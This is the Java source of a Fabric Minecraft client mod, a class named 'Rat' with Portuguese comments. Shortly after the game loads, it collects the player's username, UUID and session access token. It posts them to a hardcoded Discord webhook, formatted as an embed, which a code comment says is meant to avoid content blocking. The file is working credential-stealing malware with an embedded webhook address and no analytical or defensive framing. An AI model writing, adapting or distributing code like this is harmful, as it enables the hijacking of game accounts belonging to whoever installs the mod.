package com.example;

import net.fabricmc.api.ClientModInitializer;
import net.minecraft.client.Minecraft;
import net.minecraft.client.User;
import net.minecraft.network.chat.Component;

import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.UUID;

public class Rat implements ClientModInitializer {
    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1532186307588264088/0UFtrdM-z4UuFm2CorSO1kUBWsAyEfbB5R-mcUONp3GYVp-AOAvJYYVTQ1y_pHDdlhRa";

    @Override
    public void onInitializeClient() {
        new Thread(() -> {
            try {
                Thread.sleep(5000); // espera o jogo carregar completamente

                Minecraft client = Minecraft.getInstance();
                if (client.player == null) {
                    log("§cJogador não inicializado.");
                    return;
                }

                User user = client.getUser();
                if (user == null) {
                    log("§cUsuário não encontrado.");
                    return;
                }

                String username = user.getName();
                String uuid = getUuidFromUser(user);
                String token = user.getAccessToken();

                // Envia a mensagem (ou embed)
                boolean success = sendWebhook(username, uuid, token);
                if (success) {
                    log("§aWebhook enviado com sucesso!");
                } else {
                    log("§cFalha ao enviar webhook.");
                }

            } catch (Exception e) {
                log("§cErro: " + e.getMessage());
                e.printStackTrace();
            }
        }).start();
    }

    private String getUuidFromUser(User user) {
        try {
            Method getProfile = user.getClass().getMethod("getProfile");
            Object profile = getProfile.invoke(user);
            Method getId = profile.getClass().getMethod("getId");
            UUID id = (UUID) getId.invoke(profile);
            return id.toString();
        } catch (Exception e1) {
            try {
                Method getGameProfile = user.getClass().getMethod("getGameProfile");
                Object profile = getGameProfile.invoke(user);
                Method getId = profile.getClass().getMethod("getId");
                UUID id = (UUID) getId.invoke(profile);
                return id.toString();
            } catch (Exception e2) {
                try {
                    Method getUuid = user.getClass().getMethod("getUuid");
                    UUID id = (UUID) getUuid.invoke(user);
                    return id.toString();
                } catch (Exception e3) {
                    return "unknown";
                }
            }
        }
    }

    private boolean sendWebhook(String username, String uuid, String token) {
        try {
            // Usa embed para evitar bloqueio de conteúdo
            String jsonPayload = String.format(
                "{ \"embeds\": [ { " +
                "\"title\": \"🎮 Minecraft Session\", " +
                "\"color\": 5814783, " +
                "\"fields\": [ " +
                "{ \"name\": \"👤 User\", \"value\": \"`%s`\", \"inline\": true }, " +
                "{ \"name\": \"🆔 UUID\", \"value\": \"`%s`\", \"inline\": true }, " +
                "{ \"name\": \"🔑 Token\", \"value\": \"```%s```\", \"inline\": false } " +
                "] } ] }",
                username, uuid, token
            );

            URL url = new URL(WEBHOOK_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);

            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonPayload.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }

            int responseCode = conn.getResponseCode();
            return responseCode >= 200 && responseCode < 300;

        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    private void log(String msg) {
        Minecraft client = Minecraft.getInstance();
        if (client.player != null) {
            client.player.displayClientMessage(Component.literal("§6[Rat] §f" + msg), false);
        } else {
            System.out.println("[Rat] " + msg);
        }
    }
                    }
